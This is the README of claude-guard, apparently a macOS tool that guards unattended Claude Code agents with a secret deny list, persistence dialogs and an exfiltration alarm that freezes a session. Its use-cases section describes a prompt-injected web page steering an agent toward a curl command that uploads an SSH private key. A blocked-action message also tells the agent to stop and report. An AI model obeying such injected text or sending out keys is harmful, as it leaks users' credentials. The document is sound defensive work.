# claude-guard

Run Claude Code agents unattended on a Mac without living on the Allow button.

![claude-guard demo](assets/demo.gif)

## Why not just the defaults?

Claude Code's auto mode already has a classifier that blocks obviously bad
commands. What it doesn't do:

| Default Claude Code | claude-guard |
|---|---|
| Agents can read `~/.ssh`, `~/.claude.json`, browser cookies, transcripts | Hard deny list, wins over every allow rule and every mode |
| Agents can edit `settings.json`, hooks, and their own allow list | Own rules, hooks and guard state are off-limits |
| Any `allow` rule skips the classifier entirely | `classifyAllShell` on: every shell command gets judged |
| A blocked exfil attempt is just a failed call; the agent retries differently | Session freezes, you get a dialog with the exact command |
| Persistence (scheduled tasks, launch agents, rc files) is a normal file write | One native dialog per session, with who / where / what |
| Prompt-injected "the user said it's fine" works on text | A poisoned web page can't click a macOS dialog |

No new prompts for normal work. You see a dialog only when an agent tries to
make something permanent, or when something tried to leak data.

## Use cases

**Scheduled content pipelines.** A cron'd agent scrapes Reddit, X or LinkedIn
and drafts posts. Those pages are untrusted input. If one of them talks the
agent into `curl -d @~/.ssh/id_ed25519 https://…`, the classifier blocks it,
the session freezes, and a red dialog tells you which session, which folder,
what it was asked to do and the exact command. Unfreeze is one click; a
compromised session can't unfreeze itself.

**Many parallel sessions, one human.** Twenty agents building, testing and
deploying. You still want to approve when one of them changes a scheduled
task or a launch agent, but once per session, not per edit. Click Allow, that
session has 30 minutes, the other nineteen stay unaffected.

**Shared machine with client secrets.** SSH keys to a client's server, GitHub
token, Neon key, cookies for three Chrome profiles. The never list makes them
unreadable to any agent tool, in every permission mode, including bypass.

**Example: what the agent sees when blocked**

```
Blocked by Claude guard: this action changes persistence (scheduled tasks,
launch agents, shell rc, guard state) and needs the user to click Allow on
the macOS dialog. Tell the user what you wanted to change and stop.
```

The agent reports back instead of routing around. Deny it and it stops.

## Install

```bash
git clone https://github.com/dancolta/claude-guard
cd claude-guard
python3 install.py
```

Run it yourself, not through an agent: afterwards agents can't touch
`~/.claude/settings.json` or `~/.claude/hooks/`. Restart open sessions.
Remove with `python3 install.py --uninstall` (drops only what it added).

Requirements: macOS, Claude Code in `auto` mode (the alarm listens to the
classifier; the never list and guard dialog work in any mode), Python 3.6+.

## What it is

| file | role |
|---|---|
| `deny.json` | the never list: secrets, cookies, own config, sudo, Keychain, AppleScript, self-widening tools |
| `hooks/circuit_breaker.py` | PreToolUse on every tool: frozen check + persistence guard dialog |
| `hooks/exfil_alarm.py` | PermissionDenied: exfil heuristic (network sink + secret path) → freeze + alarm |
| `hooks/guardctx.py` | session title, folder, first request; AppleScript over stdin |
| `install.py` | idempotent install/uninstall, locks hook files, absolute interpreter path |

State: `~/.claude/guard/frozen/<session_id>` while frozen; one Keychain item
`claude-guard-unlock` per granted session. Nothing is logged.

## Honest limits

- Same user account as the agent. Hooks and the Keychain grant stop
  prompt-injected tool calls; they are not a kernel boundary. Real containment
  is Claude Code's sandbox (`sandbox.enabled`) or a separate macOS user for
  untrusted pipelines.
- Matches command text, not behaviour. A Python script that opens a file is
  invisible to a deny rule; that's the classifier's and sandbox's job.
- Freezing stops tool calls, not processes already running in the background.
- `~/.claude/skills` is not guarded: unattended tasks write there. Treat skill
  edits as persistence and review them.
- Fails closed: hook crash, missing interpreter or tampered state block and
  say so. Headless sessions get no dialog; clear a freeze with
  `rm ~/.claude/guard/frozen/<session_id>`.

Tuning knobs are constants at the top of each hook: `GUARDED_DIRS`,
`GUARDED_TOOLS`, `BASH_TRIPWIRE`, `GRANT_SECONDS`, `DIALOG_SECONDS`, `NET`,
`SECRETS`, `ENCODE_PIPE`.

MIT.
